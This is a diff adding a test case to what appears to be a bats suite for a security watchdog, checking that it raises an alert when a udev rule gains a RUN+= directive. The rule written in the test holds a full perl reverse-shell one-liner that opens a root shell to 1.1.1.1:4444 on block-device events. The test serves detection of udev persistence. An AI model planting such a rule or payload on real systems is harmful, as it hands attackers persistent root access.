@@ -343,3 +343,17 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant in RUN+= directive — perl-interpreter-rev-shell axis on udev device-event-trigger surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp udev RUN+=
+    # rev-shell variants. Perl on every Debian/Ubuntu. Locks
+    # perl axis on T1546 udev device-event-trigger root-exec
+    # persistence — RUN+= fires AS ROOT on every USB insert /
+    # NIC add / block device discover.
+    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'SUBSYSTEM=="block", RUN+="/bin/sh -c \\"perl -e \\\\\\"use Socket;\\$i=\\\\\\\\\\\\\\"1.1.1.1\\\\\\\\\\\\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\\\\\\\\\"tcp\\\\\\\\\\\\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\\\\\\\\\\\\\"/bin/sh -i\\\\\\\\\\\\\\");\\\\\\"\\""\n' > "${RULE}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
